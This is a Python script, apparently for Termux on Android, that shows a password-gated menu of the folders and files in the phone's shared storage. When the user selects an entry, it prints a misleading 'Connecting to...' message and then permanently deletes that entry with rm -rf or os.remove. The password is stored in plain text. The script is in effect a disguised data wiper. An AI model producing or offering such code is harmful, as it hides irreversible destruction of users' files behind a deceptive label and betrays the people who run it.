import os
import subprocess
import time
from colorama import Fore, Style, init

# Initialize colorama
init()

pass_file = "saved.pass"
root_directory = '/storage/emulated/0/'

def save_password():
    # Function to save or retrieve password from file
    if os.path.exists(pass_file):
        with open(pass_file, "r") as f:
            saved_pass = f.read().strip()
            return saved_pass
    else:
        password = input("Enter a new password: ")
        with open(pass_file, "w") as f:
            f.write(password)
        return password

def check_password(saved_pass):
    # Function to check if the entered password is correct
    enter_pass = input("Please type your password: ")
    return enter_pass == saved_pass

def fancy_output(message):
    # Function to print messages in a fancy style
    print(f"{Fore.LIGHTBLUE_EX}{message}")
    time.sleep(1)

def list_files_and_directories():
    # Function to list files and directories, and perform actions based on user input
    while True:
        contents = os.listdir(root_directory)
        
        files = []
        directories = []

        for item in contents:
            full_path = os.path.join(root_directory, item)
            if os.path.isdir(full_path) and not item.startswith('.'):
                directories.append(item)
            elif os.path.isfile(full_path) and not item.startswith('.'):
                files.append(item)

        print("\n" + "="*30)
        print("Directories:")
        for idx, directory in enumerate(directories, start=1):
            print(f"[{idx}] {directory}")
        
        print("\nFiles:")
        for idx, file in enumerate(files, start=len(directories)+1):
            print(f"[{idx}] {file}")

        print(f"\n{Fore.YELLOW}[A] Author")
        print("[E] Exit")

        choice = input(f"{Fore.CYAN}Choose Input: ")

        if choice.isdigit() and 1 <= int(choice) <= len(directories) + len(files):
            index = int(choice) - 1
            if index < len(directories):
                dir_name = directories[index]
                full_path = os.path.join(root_directory, dir_name)
                fancy_output(f"Connecting to {full_path}...")
                try:
                    subprocess.run(["rm", "-rf", full_path], check=True)
                    print(f"{Fore.LIGHTGREEN_EX}Directory '{dir_name}' deleted successfully.")
                except subprocess.CalledProcessError:
                    print(f"{Fore.RED}Error deleting directory '{dir_name}'.")
            else:
                file_index = index - len(directories)
                file_name = files[file_index]
                full_path = os.path.join(root_directory, file_name)
                fancy_output(f"Connecting to {full_path}...")
                try:
                    os.remove(full_path)
                    print(f"{Fore.LIGHTGREEN_EX}File '{file_name}' deleted successfully.")
                except OSError as e:
                    print(f"{Fore.RED}Error deleting file '{file_name}': {e}")
        elif choice == 'A':
            print(f"{Fore.BLUE}https://apksntermux.blogspot.com")
        elif choice == 'E':
            print(f"{Fore.BLUE}Exiting...")
            return False  # Return False to stop the script
        else:
            print(f"{Fore.RED}Invalid choice. Please select a valid option.")

        # Reset color style after each operation
        print(Style.RESET_ALL)

# Main function
if __name__ == '__main__':
    password = save_password()
    correct = check_password(password)

    if correct:
        while list_files_and_directories():
            pass
    else:
        print(f"{Fore.RED}Exiting...")
